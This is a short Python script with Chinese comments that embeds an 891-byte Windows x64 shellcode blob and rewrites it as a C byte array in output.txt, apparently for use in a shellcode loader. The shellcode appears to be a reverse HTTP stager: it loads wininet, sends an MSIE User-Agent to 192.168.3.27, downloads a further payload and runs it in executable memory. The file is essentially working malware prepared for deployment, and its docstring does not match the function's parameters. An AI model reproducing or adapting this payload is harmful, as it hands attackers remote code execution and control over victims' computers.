import os
def extract_and_write(output_file, process_string):
    """
    input_file (str): 输入文件路径
    output_file (str): 输出文件路径
    length (int): 要提取的字符串长度
    """
    # 获取当前脚本所在的目录
    current_dir = os.path.dirname(os.path.abspath(__file__))

    # 构建指向上一级目录的路径
    parent_dir = os.path.dirname(current_dir)

    # 构建完整的文件路径
    file_path = os.path.join(parent_dir, output_file)

    try:
        with open(file_path, 'w', encoding='utf-8') as outfile:
            outfile.write(process_string)
    except Exception as e:
        print(f"发生错误: {e}")

# length: 891 bytes
shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x58\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x53\x5a\x41\x6f\x00\x01\x82\xed\x20\xc3\xf8\x0d\xbb\x8d\xe4\x46\xb5\xe7\xfe\xd1\x61\x05\x44\xc9\x6c\xf9\x86\x0f\x8d\x70\x50\xaf\xec\xb5\xc2\x20\x29\x3f\xb9\x49\x6e\xc6\x15\xc7\x3e\xd9\x88\xf5\x1a\x42\x0f\xf7\x6a\xc9\x1d\x65\xfd\x13\x2d\x9f\x25\x7e\xeb\xa5\x2f\xef\x73\xf9\xa9\x60\x6d\x10\xd2\x07\x6e\x74\x75\xc7\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x41\x53\x55\x32\x4a\x53\x29\x0d\x0a\x00\x0d\x8f\xe6\x0c\xa2\x7d\x49\xa9\x5a\xed\x52\xa2\xe2\x6e\x97\x72\xe3\x62\xa5\xfa\x7c\x7d\xf1\x13\xd4\x2b\xbd\x41\x36\xef\xa5\x62\x00\x6e\x85\x67\x2a\x28\x0b\xe7\x6d\xb6\x94\x6c\xa3\x3e\xa1\x84\x51\x7b\x3f\x8b\xfb\xa2\x33\x33\xfe\xc5\x1a\xb9\x2e\x56\x35\x90\x7a\x9f\xbc\x2d\x23\x28\x42\xa9\xd8\x5d\xa1\x20\xba\xe1\x1a\x21\xdc\xb5\xde\x4f\xaf\x90\x59\x7f\x03\x72\x84\x08\x29\x8b\xaf\x7c\x70\x33\x51\xd4\x4c\x4e\x21\x2b\xfc\xb2\x1e\x87\xfc\xe8\x81\xf0\xce\x45\x21\xa0\x65\x5f\x16\x11\xf4\x8d\x95\x0c\xdd\x97\x22\x95\x70\x94\xf0\x58\x18\x41\x2a\x2b\x72\xb0\x5c\x0a\xbf\x92\x43\x46\xbd\xb2\x45\x9c\xb4\x1b\xd0\x5f\x4a\x5e\xe9\x40\x37\xa3\x92\x6e\xca\xef\xfa\xab\x08\xed\x05\xe9\x0d\x07\x61\x53\x11\xb3\x1d\xc4\x86\xcd\xaa\xef\x76\xc0\x16\x3c\x82\x59\xe2\xa7\xee\x96\x00\x3b\x7b\x0a\xc4\xbc\x4b\x58\x95\x79\xaf\x62\x71\xe4\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x33\x2e\x32\x37\x00\x5e\x2e\x78\x90"

c_array = ""
for byte in shellcode:
    c_array += f"0x{byte:02x},"
c_array = c_array.rstrip(",")

outpath = "output.txt"
extract_and_write(outpath, c_array)